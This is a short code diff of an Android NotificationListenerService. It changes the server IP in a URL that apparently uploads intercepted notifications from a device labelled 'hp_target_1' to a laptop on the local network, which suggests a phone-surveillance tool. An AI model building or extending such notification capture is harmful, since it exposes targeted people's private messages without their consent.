@@ -16,7 +16,7 @@ import java.util.Locale;
 public class NotificationService extends NotificationListenerService {
 
     // SESUAIKAN IP INI DENGAN IP LAPTOP KAMU SEKARANG
-    private static final String SERVER_URL = "http://192.168.1.19:5000/api/upload_notification/hp_target_1";
+    private static final String SERVER_URL = "http://192.168.1.20:5000/api/upload_notification/hp_target_1";
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
